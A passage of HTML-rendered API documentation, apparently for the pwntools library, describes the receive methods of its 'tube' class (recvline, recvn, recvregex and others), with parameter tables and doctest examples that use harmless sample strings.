<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="s1">&#39;Hello, world&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;Hello, world&#39;</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">unrecv</span><span class="p">(</span><span class="s1">&#39;Woohoo&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;Woohoo&#39;</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">):</span>
<span class="gp">... </span>   <span class="n">_</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span> 
<span class="go">[...] Received 0xc bytes:</span>
<span class="go">    &#39;Hello, world&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.recvall">
<code class="descname">recvall</code><span class="sig-paren">(</span><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L656-676"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.recvall" title="Permalink to this definition">¶</a></dt>
<dd><p>Receives data until EOF is reached.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.recvline">
<code class="descname">recvline</code><span class="sig-paren">(</span><em>keepends = True</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L392-426"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.recvline" title="Permalink to this definition">¶</a></dt>
<dd><p>Receive a single line from the tube.</p>
<p>A &#8220;line&#8221; is any sequence of bytes terminated by the byte sequence
set in <a class="reference internal" href="#pwnlib.tubes.tube.tube.newline" title="pwnlib.tubes.tube.tube.newline"><code class="xref py py-attr docutils literal"><span class="pre">newline</span></code></a>, which defaults to <code class="docutils literal"><span class="pre">'\n'</span></code>.</p>
<p>If the request is not satisfied before <code class="docutils literal"><span class="pre">timeout</span></code> seconds pass,
all data is buffered and an empty string (<code class="docutils literal"><span class="pre">''</span></code>) is returned.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>keepends</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Keep the line ending (<code class="xref py py-const docutils literal"><span class="pre">True</span></code>).</li>
<li><strong>timeout</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Timeout</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">All bytes received over the tube until the first
newline <code class="docutils literal"><span class="pre">'\n'</span></code> is received.  Optionally retains
the ending.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="s1">&#39;Foo</span><span class="se">\n</span><span class="s1">Bar</span><span class="se">\r\n</span><span class="s1">Baz</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Foo\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Bar\r\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span>
<span class="go">&#39;Baz&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">newline</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span>
<span class="go">&#39;Foo\nBar&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.recvline_contains">
<code class="descname">recvline_contains</code><span class="sig-paren">(</span><em>items</em>, <em>keepends=False</em>, <em>timeout=pwnlib.timeout.Timeout.default</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L476-508"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.recvline_contains" title="Permalink to this definition">¶</a></dt>
<dd><p>Receive lines until one line is found which contains at least
one of <cite>items</cite>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>items</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>,</em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#tuple" title="(in Python v2.7)"><em>tuple</em></a>) &#8211; List of strings to search for, or a single string.</li>
<li><strong>keepends</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Return lines with newlines if <code class="xref py py-const docutils literal"><span class="pre">True</span></code></li>
<li><strong>timeout</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Timeout, in seconds</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="s2">&quot;Hello</span><span class="se">\n</span><span class="s2">World</span><span class="se">\n</span><span class="s2">Xylophone</span><span class="se">\n</span><span class="s2">&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline_contains</span><span class="p">(</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
<span class="go">&#39;World&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">f</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="s2">&quot;cat dog bird</span><span class="se">\n</span><span class="s2">apple pear orange</span><span class="se">\n</span><span class="s2">bicycle car train</span><span class="se">\n</span><span class="s2">&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="n">f</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline_contains</span><span class="p">(</span><span class="s1">&#39;pear&#39;</span><span class="p">)</span>
<span class="go">&#39;apple pear orange&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="n">f</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline_contains</span><span class="p">((</span><span class="s1">&#39;car&#39;</span><span class="p">,</span> <span class="s1">&#39;train&#39;</span><span class="p">))</span>
<span class="go">&#39;bicycle car train&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.recvline_endswith">
<code class="descname">recvline_endswith</code><span class="sig-paren">(</span><em>delims</em>, <em>keepends = False</em>, <em>timeout = default</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L546-576"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.recvline_endswith" title="Permalink to this definition">¶</a></dt>
<dd><p>Keep receiving lines until one is found that starts with one of
<cite>delims</cite>.  Returns the last line received.</p>
<p>If the request is not satisfied before <code class="docutils literal"><span class="pre">timeout</span></code> seconds pass,
all data is buffered and an empty string (<code class="docutils literal"><span class="pre">''</span></code>) is returned.</p>
<p>See <a class="reference internal" href="#pwnlib.tubes.tube.tube.recvline_startswith" title="pwnlib.tubes.tube.tube.recvline_startswith"><code class="xref py py-meth docutils literal"><span class="pre">recvline_startswith()</span></code></a> for more details.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="s1">&#39;Foo</span><span class="se">\n</span><span class="s1">Bar</span><span class="se">\n</span><span class="s1">Baz</span><span class="se">\n</span><span class="s1">Kaboodle</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline_endswith</span><span class="p">(</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
<span class="go">&#39;Bar&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline_endswith</span><span class="p">(</span><span class="nb">tuple</span><span class="p">(</span><span class="s1">&#39;abcde&#39;</span><span class="p">),</span> <span class="kc">True</span><span class="p">)</span>
<span class="go">&#39;Kaboodle\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline_endswith</span><span class="p">(</span><span class="s1">&#39;oodle&#39;</span><span class="p">)</span>
<span class="go">&#39;Kaboodle&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.recvline_pred">
<code class="descname">recvline_pred</code><span class="sig-paren">(</span><em>pred</em>, <em>keepends = False</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L428-474"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.recvline_pred" title="Permalink to this definition">¶</a></dt>
<dd><p>Receive data until <code class="docutils literal"><span class="pre">pred(line)</span></code> returns a truthy value.
Drop all other data.</p>
<p>If the request is not satisfied before <code class="docutils literal"><span class="pre">timeout</span></code> seconds pass,
all data is buffered and an empty string (<code class="docutils literal"><span class="pre">''</span></code>) is returned.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>pred</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#callable" title="(in Python v2.7)"><em>callable</em></a>) &#8211; Function to call.  Returns the line for which
this function returns <code class="xref py py-const docutils literal"><span class="pre">True</span></code>.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="s2">&quot;Foo</span><span class="se">\n</span><span class="s2">Bar</span><span class="se">\n</span><span class="s2">Baz</span><span class="se">\n</span><span class="s2">&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline_pred</span><span class="p">(</span><span class="k">lambda</span> <span class="n">line</span><span class="p">:</span> <span class="n">line</span> <span class="o">==</span> <span class="s2">&quot;Bar</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="go">&#39;Bar&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline_pred</span><span class="p">(</span><span class="k">lambda</span> <span class="n">line</span><span class="p">:</span> <span class="n">line</span> <span class="o">==</span> <span class="s2">&quot;Bar</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">keepends</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="go">&#39;Bar\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline_pred</span><span class="p">(</span><span class="k">lambda</span> <span class="n">line</span><span class="p">:</span> <span class="n">line</span> <span class="o">==</span> <span class="s1">&#39;Nope!&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>
<span class="go">&#39;&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.recvline_regex">
<code class="descname">recvline_regex</code><span class="sig-paren">(</span><em>regex</em>, <em>exact=False</em>, <em>keepends=False</em>, <em>timeout=pwnlib.timeout.Timeout.default</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L601-622"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.recvline_regex" title="Permalink to this definition">¶</a></dt>
<dd><p>recvregex(regex, exact = False, keepends = False, timeout = default) -&gt; str</p>
<p>Wrapper around <a class="reference internal" href="#pwnlib.tubes.tube.tube.recvline_pred" title="pwnlib.tubes.tube.tube.recvline_pred"><code class="xref py py-func docutils literal"><span class="pre">recvline_pred()</span></code></a>, which will return when a regex
matches a line.</p>
<p>By default <code class="xref py py-func docutils literal"><span class="pre">re.RegexObject.search()</span></code> is used, but if <cite>exact</cite> is
set to True, then <code class="xref py py-func docutils literal"><span class="pre">re.RegexObject.match()</span></code> will be used instead.</p>
<p>If the request is not satisfied before <code class="docutils literal"><span class="pre">timeout</span></code> seconds pass,
all data is buffered and an empty string (<code class="docutils literal"><span class="pre">''</span></code>) is returned.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.recvline_startswith">
<code class="descname">recvline_startswith</code><span class="sig-paren">(</span><em>delims</em>, <em>keepends = False</em>, <em>timeout = default</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L510-544"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.recvline_startswith" title="Permalink to this definition">¶</a></dt>
<dd><p>Keep receiving lines until one is found that starts with one of
<cite>delims</cite>.  Returns the last line received.</p>
<p>If the request is not satisfied before <code class="docutils literal"><span class="pre">timeout</span></code> seconds pass,
all data is buffered and an empty string (<code class="docutils literal"><span class="pre">''</span></code>) is returned.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>delims</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>,</em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#tuple" title="(in Python v2.7)"><em>tuple</em></a>) &#8211; List of strings to search for, or string of single characters</li>
<li><strong>keepends</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Return lines with newlines if <code class="xref py py-const docutils literal"><span class="pre">True</span></code></li>
<li><strong>timeout</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Timeout, in seconds</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The first line received which starts with a delimiter in <code class="docutils literal"><span class="pre">delims</span></code>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="s2">&quot;Hello</span><span class="se">\n</span><span class="s2">World</span><span class="se">\n</span><span class="s2">Xylophone</span><span class="se">\n</span><span class="s2">&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline_startswith</span><span class="p">(</span><span class="nb">tuple</span><span class="p">(</span><span class="s1">&#39;WXYZ&#39;</span><span class="p">))</span>
<span class="go">&#39;World&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline_startswith</span><span class="p">(</span><span class="nb">tuple</span><span class="p">(</span><span class="s1">&#39;WXYZ&#39;</span><span class="p">),</span> <span class="kc">True</span><span class="p">)</span>
<span class="go">&#39;Xylophone\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvline_startswith</span><span class="p">(</span><span class="s1">&#39;Wo&#39;</span><span class="p">)</span>
<span class="go">&#39;World&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.recvlines">
<code class="descname">recvlines</code><span class="sig-paren">(</span><em>numlines</em>, <em>keepends = False</em>, <em>timeout = default</em><span class="sig-paren">)</span> &#x2192; str list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L335-390"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.recvlines" title="Permalink to this definition">¶</a></dt>
<dd><p>Receive up to <code class="docutils literal"><span class="pre">numlines</span></code> lines.</p>
<p>A &#8220;line&#8221; is any sequence of bytes terminated by the byte sequence
set by <a class="reference internal" href="#pwnlib.tubes.tube.tube.newline" title="pwnlib.tubes.tube.tube.newline"><code class="xref py py-attr docutils literal"><span class="pre">newline</span></code></a>, which defaults to <code class="docutils literal"><span class="pre">'\n'</span></code>.</p>
<p>If the request is not satisfied before <code class="docutils literal"><span class="pre">timeout</span></code> seconds pass,
all data is buffered and an empty string (<code class="docutils literal"><span class="pre">''</span></code>) is returned.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>numlines</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Maximum number of lines to receive</li>
<li><strong>keepends</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Keep newlines at the end of each line (<code class="xref py py-const docutils literal"><span class="pre">False</span></code>).</li>
<li><strong>timeout</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Maximum timeout</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Raises:</th><td class="field-body"><p class="first"><a class="reference external" href="https://docs.python.org/2.7/library/exceptions.html#exceptions.EOFError" title="(in Python v2.7)"><code class="xref py py-exc docutils literal"><span class="pre">exceptions.EOFError</span></code></a> &#8211; The connection closed before the request could be satisfied</p>
</td>
</tr>
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A string containing bytes received from the socket,
or <code class="docutils literal"><span class="pre">''</span></code> if a timeout occurred while waiting.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvlines</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="go">[&#39;&#39;, &#39;&#39;, &#39;&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="s1">&#39;Foo</span><span class="se">\n</span><span class="s1">Bar</span><span class="se">\n</span><span class="s1">Baz</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvlines</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="go">[&#39;Foo&#39;, &#39;Bar&#39;, &#39;Baz&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvlines</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
<span class="go">[&#39;Foo\n&#39;, &#39;Bar\n&#39;, &#39;Baz\n&#39;]</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.recvn">
<code class="descname">recvn</code><span class="sig-paren">(</span><em>numb</em>, <em>timeout = default</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L200-244"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.recvn" title="Permalink to this definition">¶</a></dt>
<dd><p>Receives exactly <cite>n</cite> bytes.</p>
<p>If the request is not satisfied before <code class="docutils literal"><span class="pre">timeout</span></code> seconds pass,
all data is buffered and an empty string (<code class="docutils literal"><span class="pre">''</span></code>) is returned.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Raises:</th><td class="field-body"><a class="reference external" href="https://docs.python.org/2.7/library/exceptions.html#exceptions.EOFError" title="(in Python v2.7)"><code class="xref py py-exc docutils literal"><span class="pre">exceptions.EOFError</span></code></a> &#8211; The connection closed before the request could be satisfied</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">A string containing bytes received from the socket,
or <code class="docutils literal"><span class="pre">''</span></code> if a timeout occurred while waiting.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;hello world&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="o">*</span><span class="n">a</span><span class="p">:</span> <span class="n">data</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">==</span> <span class="n">data</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="n">data</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="o">*</span><span class="n">a</span><span class="p">:</span> <span class="kc">None</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># The remaining data is buffered</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span> <span class="o">==</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="o">*</span><span class="n">a</span><span class="p">:</span> <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span> <span class="ow">or</span> <span class="s1">&#39;a&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.05</span><span class="p">)</span>
<span class="go">&#39;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.06</span><span class="p">)</span> 
<span class="go">&#39;aaaaaa...&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.recvpred">
<code class="descname">recvpred</code><span class="sig-paren">(</span><em>pred</em>, <em>timeout = default</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L161-198"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.recvpred" title="Permalink to this definition">¶</a></dt>
<dd><p>Receives one byte at a time from the tube, until <code class="docutils literal"><span class="pre">pred(bytes)</span></code>
evaluates to True.</p>
<p>If the request is not satisfied before <code class="docutils literal"><span class="pre">timeout</span></code> seconds pass,
all data is buffered and an empty string (<code class="docutils literal"><span class="pre">''</span></code>) is returned.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>pred</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#callable" title="(in Python v2.7)"><em>callable</em></a>) &#8211; Function to call, with the currently-accumulated data.</li>
<li><strong>timeout</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Timeout for the operation</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Raises:</th><td class="field-body"><p class="first"><a class="reference external" href="https://docs.python.org/2.7/library/exceptions.html#exceptions.EOFError" title="(in Python v2.7)"><code class="xref py py-exc docutils literal"><span class="pre">exceptions.EOFError</span></code></a> &#8211; The connection is closed</p>
</td>
</tr>
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A string containing bytes received from the socket,
or <code class="docutils literal"><span class="pre">''</span></code> if a timeout occurred while waiting.</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.recvregex">
<code class="descname">recvregex</code><span class="sig-paren">(</span><em>regex</em>, <em>exact = False</em>, <em>timeout = default</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L578-599"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.recvregex" title="Permalink to this definition">¶</a></dt>
<dd><p>Wrapper around <a class="reference internal" href="#pwnlib.tubes.tube.tube.recvpred" title="pwnlib.tubes.tube.tube.recvpred"><code class="xref py py-func docutils literal"><span class="pre">recvpred()</span></code></a>, which will return when a regex
matches the string in the buffer.</p>
